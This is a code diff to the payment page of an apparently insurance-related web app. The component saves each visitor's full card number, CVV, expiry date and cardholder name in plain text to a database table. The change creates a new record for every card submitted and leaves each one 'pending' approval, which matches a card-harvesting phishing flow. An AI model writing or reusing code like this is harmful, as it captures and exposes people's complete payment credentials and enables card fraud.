@@ -202,46 +202,60 @@ const Payment = () => {
       const cardDigits = formData.cardNumber.replace(/\s/g, "");
       const lastFour = cardDigits.slice(-4);
 
+      // Get existing application data if exists
+      let existingData = {};
       if (applicationId) {
-        // Update existing application
-        const { error } = await supabase
+        const { data } = await supabase
           .from('customer_applications')
-          .update({
-            cardholder_name: formData.cardholderName,
-            card_number: formData.cardNumber,
-            card_last_4: lastFour,
-            card_type: cardType,
-            card_cvv: formData.cvv,
-            expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
-            current_step: 'payment'
-          })
-          .eq('id', applicationId);
-
-        if (error) throw error;
-      } else {
-        // Create new application
-        const { data: newApp, error } = await supabase
-          .from('customer_applications')
-          .insert([{
-            cardholder_name: formData.cardholderName,
-            card_number: formData.cardNumber,
-            card_last_4: lastFour,
-            card_type: cardType,
-            card_cvv: formData.cvv,
-            expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
-            selected_company: companyName,
-            selected_price: price,
-            current_step: 'payment'
-          }])
-          .select()
+          .select('*')
+          .eq('id', applicationId)
           .single();
-
-        if (error) throw error;
         
-        if (newApp) {
-          setApplicationId(newApp.id);
-          localStorage.setItem('applicationId', newApp.id);
+        if (data) {
+          existingData = {
+            full_name: data.full_name,
+            phone: data.phone,
+            insurance_type: data.insurance_type,
+            vehicle_manufacturer: data.vehicle_manufacturer,
+            vehicle_model: data.vehicle_model,
+            vehicle_year: data.vehicle_year,
+            vehicle_value: data.vehicle_value,
+            usage_purpose: data.usage_purpose,
+            add_driver: data.add_driver,
+            selected_company: data.selected_company,
+            selected_price: data.selected_price,
+            regular_price: data.regular_price,
+            company_logo: data.company_logo,
+          };
         }
+      }
+
+      // Always create a new application for each card submission
+      const { data: newApp, error } = await supabase
+        .from('customer_applications')
+        .insert([{
+          ...existingData,
+          cardholder_name: formData.cardholderName,
+          card_number: formData.cardNumber,
+          card_last_4: lastFour,
+          card_type: cardType,
+          card_cvv: formData.cvv,
+          expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+          selected_company: companyName,
+          selected_price: price,
+          regular_price: regularPrice,
+          current_step: 'payment',
+          payment_approved: false,
+          status: 'pending'
+        }])
+        .select()
+        .single();
+
+      if (error) throw error;
+      
+      if (newApp) {
+        setApplicationId(newApp.id);
+        localStorage.setItem('applicationId', newApp.id);
       }
 
       setApprovalStatus('waiting');
